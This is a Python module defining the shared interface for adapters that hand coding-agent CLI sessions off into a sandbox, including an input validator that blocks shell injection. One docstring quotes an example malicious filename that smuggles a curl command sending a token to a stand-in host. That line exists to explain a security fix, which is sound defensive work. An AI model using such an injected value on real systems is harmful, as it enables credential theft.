"""Shared contract every per-tool handoff adapter implements.

An adapter's job is entirely local: find the tool's own on-disk session
state, decide what has to be copied into a fresh sandbox for
`--resume`-style continuation to work, and hand back the exact command
line the sandbox's takeover shell should type to pick the session back up.
Session provisioning, file transfer, and terminal streaming are NOT an
adapter's job -- see orchestrator.py, written once and shared by every
adapter. See docs/handoff-adapters.md for the full contract writeup.
"""

from __future__ import annotations

import re
from collections.abc import Callable, Iterable
from dataclasses import dataclass
from pathlib import Path
from typing import Protocol


@dataclass(frozen=True)
class SessionFile:
    """One local file that must exist at `sandbox_path` inside the sandbox
    for this tool's own resume mechanism to find it."""

    local_path: Path
    sandbox_path: str


@dataclass(frozen=True)
class Credential:
    """A portable, scoped credential -- never the raw local OAuth session
    cookie or keychain entry -- that authenticates the CLI headlessly once
    it's running in the sandbox. See docs/handoff-adapters.md's credential
    table for what this should be per tool."""

    env_var: str
    value: str


@dataclass(frozen=True)
class LocatedSession:
    """What one adapter's locate_session() call found for one local
    session, ready for the orchestrator to push into a sandbox.

    `cleanup`, if set, is called by the orchestrator once every file in
    `files` has been read (whether or not the push/takeover that follows
    succeeds) -- for an adapter that materializes a temporary local copy of
    session data (see opencode.py's exported-session file) rather than
    pointing straight at an existing on-disk file, so that copy doesn't
    linger on the local machine after it's served its purpose."""

    tool: str
    session_id: str
    files: tuple[SessionFile, ...]
    credential: Credential
    resume_command: str
    workdir: str
    cleanup: Callable[[], None] | None = None


class HandoffError(RuntimeError):
    """Raised by an adapter when it can't locate a local session or a
    usable credential. Surfaced to the CLI user as a plain error message --
    never swallowed into silently starting a fresh/empty session instead of
    the one the user asked to hand off."""


_SAFE_IDENTIFIER_RE = re.compile(r"[A-Za-z0-9._-]+")


def validate_identifier(value: str, *, what: str) -> str:
    """Reject anything that isn't a plain, shell-metacharacter-free token
    (letters, digits, dot, underscore, hyphen) before an adapter embeds it
    into a `resume_command` string -- `orchestrator.py` types
    `resume_command` into the takeover shell verbatim, unquoted, trusting
    adapters to have validated any dynamic component first.

    This closes a real injection path found in security review: a session
    id or filename discovered by scanning the local filesystem (rather
    than an explicit --session the operator typed themselves) is
    attacker-adjacent on a compromised local machine -- a planted file
    named e.g. `x'; curl evil.example/$TOKEN #.jsonl` would otherwise reach
    `resume_command` unvalidated and execute in a shell that already has
    the just-exported credential in its environment. `what` names the
    field being validated, for a useful HandoffError message."""
    if not _SAFE_IDENTIFIER_RE.fullmatch(value):
        raise HandoffError(
            f"{what} {value!r} contains characters outside [A-Za-z0-9._-] -- refusing to "
            "embed it in a shell command typed into the sandbox."
        )
    return value


def most_recent_by_mtime(paths: Iterable[Path]) -> Path:
    """The single most-recently-modified path in `paths`. Shared by every
    adapter that picks "the latest local session" when `session_ref` is
    None, so that selection rule (and its empty-input behavior) lives in
    one place rather than being reimplemented per adapter. Raises
    ValueError on an empty iterable -- callers are expected to have already
    raised a tool-specific HandoffError before this point if no candidate
    exists, so an empty call here would itself be a caller bug."""
    return max(paths, key=lambda p: p.stat().st_mtime)


class HandoffAdapter(Protocol):
    """One implementation per coding-agent CLI. `name` is the value users
    pass as `boxkite-handoff <name>`."""

    name: str

    def locate_session(self, *, session_ref: str | None = None) -> LocatedSession:
        """Find the local session to hand off. `session_ref` is an
        adapter-specific selector (a session/thread id, or None to mean
        "the most recent local session for the current directory/tool").
        Raises HandoffError if no matching local session or usable
        credential can be found."""
        ...
